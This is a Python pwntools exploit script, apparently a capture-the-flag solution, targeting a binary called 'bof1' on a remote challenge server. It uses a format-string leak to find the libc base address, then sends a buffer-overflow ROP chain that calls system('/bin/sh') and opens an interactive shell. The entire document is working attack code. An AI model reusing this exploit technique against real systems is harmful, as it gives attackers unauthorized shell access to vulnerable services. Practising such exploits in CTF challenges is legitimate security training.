#!/usr/bin/env python3

from pwn import *

io = remote('freefall.chall.winja.site',18967)
#io = process('./bof1')
elf = ELF('./bof1')
libc = elf.libc

POP_RDI = 0x0040124b
RET = 0x00000000004011e7
#c = input(f'gdb: {io.pid}')
buffer = 40
fmt = b'%3$llx'

payload_leak = fmt + b'A'*(buffer- len(fmt)) + p64(RET) + p64(elf.sym.main)
#payload_leak = b'A'*buffer + p64(elf.sym.win)
io.recvline()
io.sendline(payload_leak)
#print(io.recvall())

libc.address = int(io.recv(12).decode(),16) - libc.sym._IO_2_1_stdin_

info(f'LIBC: {hex(libc.address)}')

#io.recvline()

shell =  b'A' * 40 + p64(RET) + p64(POP_RDI) + p64(next(libc.search(b'/bin/sh\x00'))) + p64(elf.plt.system)
io.sendline(shell)
io.interactive()
